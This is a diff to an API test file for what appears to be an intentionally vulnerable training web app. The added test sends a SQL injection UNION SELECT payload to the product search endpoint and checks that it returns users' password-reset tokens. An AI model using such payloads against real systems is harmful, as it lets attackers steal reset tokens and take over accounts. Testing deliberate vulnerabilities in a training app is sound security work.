@@ -8,6 +8,7 @@ import { expect } from '@jest/globals'
 import * as security from '../../lib/insecurity'
 import type { Product as ProductConfig } from '../../lib/config.types'
 import config from 'config'
+import { createResetPasswordToken } from '../../lib/resetPasswordTokenUtils'
 
 const christmasProduct = config.get<ProductConfig[]>('products').filter(({ useForChristmasSpecialChallenge }) => useForChristmasSpecialChallenge)[0]
 const pastebinLeakProduct = config.get<ProductConfig[]>('products').filter(({ keywordsForPastebinDataLeakChallenge }) => keywordsForPastebinDataLeakChallenge)[0]
@@ -127,6 +128,22 @@ describe('/rest/products/search', () => {
       })
       .expect('json', 'data.?', {
         id: 'CREATE TABLE sqlite_sequence(name,seq)'
+      })
+  })
+
+  it('GET product search can inspect reset password tokens via UNION SELECT', () => {
+    const appDomain = config.get<string>('application.domain')
+
+    return frisby.get(`${REST_URL}/products/search?q=')) union select UserId,'2','3',token,expiresAt,'6','7','8','9' from ResetPasswordTokens--`)
+      .expect('status', 200)
+      .expect('header', 'content-type', /application\/json/)
+      .expect('json', 'data.?', {
+        id: 2,
+        price: createResetPasswordToken(`jim@${appDomain}`)
+      })
+      .expect('json', 'data.?', {
+        id: 3,
+        price: createResetPasswordToken(`bender@${appDomain}`)
       })
   })
 
